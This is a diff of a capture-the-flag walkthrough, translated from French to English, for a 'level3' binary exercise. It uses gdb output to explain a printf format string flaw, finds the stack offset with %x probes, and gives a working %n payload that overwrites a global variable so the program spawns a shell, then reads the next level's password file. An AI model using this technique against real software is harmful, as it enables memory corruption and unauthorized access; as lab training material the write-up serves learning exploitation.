@@ -27,16 +27,17 @@ Dump of assembler code for function v:
    0x08048518 <+116>:	leave
    0x08048519 <+117>:	ret
 End of assembler dump.
-Comme on peut le voir, l'emploi de fgets empeche une exploitation comme vu precedement.
-Nous avons cependant un printf suivi d'une comparaison en +59 qui permet si elle egale, d'avoir acces au system en +111.
-Leprintf est utiliser sans format de conversion car nous pouvons passer en argument des format de conversion tel que %x
+
+As we can see, the fgets use forbids us to exploit it
+But we can see that printf followed by the cmp in +59 which allows us if equal to access the system call in +111.
+The printf is used without format specifier because we can put as an argument format specifiers like %x.
 
 (gdb) r
 Starting program: /home/user/level3/level3
 %x
 200
 
-On va du coup chercher l'offset auquel commence la chaine a print en memoire.
+We're finding the offset on which the string starts the print in the memory.
 
 (gdb) r
 Starting program: /home/user/level3/level3
@@ -44,10 +45,10 @@ AAAA %x %x %x %x %x %x
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
 
 
-Printf a donc un offset de 4. De plus nous savons que grace au format de conversion %n, il est possible d'ecrire dans une variable le nombre de char precedement affiche.
-On sait aussi que la valeur contenue par 0x804988c (+54) est comparer a 0x40 (64) en +59.
-On va donc grace a %n changer la valeur de 0x804988c a 64 afin que la comparaison soit vraie
-Il nous faut donc l'adresse sans laquel nous allons recrire avec %n (0x804988c) en little endian + 60 char car l'adresse fait deja 4bytes + format de conversion
+Printf has a 4 offset and thatnks to the format specifier %n, it's possible to write in a variable the number of char previously displayed.
+We know that the value contained in 0x804988c (+54) is compared to 0x40 (64) in +59.
+We re going to change thanks to %n the value of 0x804988c to 64 so the comparison shows an equality
+We have need the address in which we re going to write with %n (0x804988c) in little endian +60 char because the adress in already 4 bytes long + format specifier
 
 (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
 cat /home/user/level4/.pass
